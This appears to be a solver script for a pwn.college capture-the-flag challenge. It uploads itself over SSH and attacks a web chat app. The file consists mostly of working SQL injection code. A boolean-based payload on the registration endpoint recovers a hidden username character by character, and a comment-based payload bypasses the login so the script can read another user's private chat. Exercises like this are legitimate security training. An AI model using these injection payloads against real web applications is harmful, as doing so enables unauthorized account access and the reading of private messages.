import requests
import pwn
import os
import sys
from rich.progress import track

API = "http://10.0.0.1:80"


def as_bob():
    sharon_username = brute_force_sharon_username()
    session = requests.Session()
    login_payload = {"username": "bob'--", "password": "password"}
    dumphttp(session.post(f"{API}/login", data=login_payload))
    dumphttp(session.get(f"{API}/chat/{sharon_username}"))


def brute_force_sharon_username():
    sharon_username = "sharon"
    urandom_length = 64
    for _ in track(range(urandom_length), description="Cracking sharon's username..."):
        for c in "0123456789":
            username = f"{sharon_username}{c}"
            payload = {
                "username": f"' or username like '{username}%'--",
                "password": "password",
            }
            resp = requests.post(f"{API}/register", data=payload, allow_redirects=False)
            if resp.status_code == 400:
                sharon_username = username
                break
    print(f"Sharon's username is: {sharon_username}")
    return sharon_username


def dumphttp(resp: requests.Response):
    req = resp.request
    print("{} {}".format(req.method, req.url))
    print(
        "HTTP/1.1 {}\r\n{}\r\n\r\n{}".format(
            resp.status_code,
            "\r\n".join("{}: {}".format(k, v) for k, v in resp.headers.items()),
            resp.content.decode(errors="ignore"),
        )
    )


def tee(process: pwn.tube):
    orig_send_raw = process.send_raw
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def send_raw(data, *args, **kwargs):
        output.write(data)
        output.flush()
        return orig_send_raw(data, *args, **kwargs)

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.send_raw = send_raw
    process.recv_raw = recv_raw


def hack():
    as_bob()


def boot():
    remote_script = "/tmp/pwnsolver.py"

    with pwn.process(["/challenge/run"]) as io:
        tee(io)
        # wait for signal of bootup completion
        io.recvuntil(b"\r")
        io.info("Starting the hacking script...")
        io.sendline(f"python3 {remote_script} hack".encode())
        # keep triggering tee's recv_raw until it receives the stop signal
        io.recvuntil(b"pwn.college{")
        # send EOF to stop the process
        io.shutdown()
        io.info("Done! Check the output above for the flag.")


def main():
    remote_script = "/tmp/pwnsolver.py"
    # raw to skip checksec
    ssh = pwn.ssh(user="hacker", host="dojo.pwn.college", raw=True)
    local_script = os.path.abspath(__file__)
    ssh.upload(local_script, remote_script)
    argv = ["/run/dojo/bin/python3", remote_script]
    # requires patch from https://github.com/Gallopsled/pwntools/pull/2627 on Python 3.14+
    io: pwn.tubes.ssh.ssh_process
    io = ssh.process(argv, argv[0], aslr=True)  # type: ignore
    tee(io)
    # keep triggering tee's recv_raw until remote process joins
    io.recvrepeat()
    io.wait()


if __name__ == "__main__":
    if sys.argv[1:2] == ["hack"]:
        hack()
    elif os.environ.get("DOJO_AUTH_TOKEN"):
        boot()
    else:
        main()
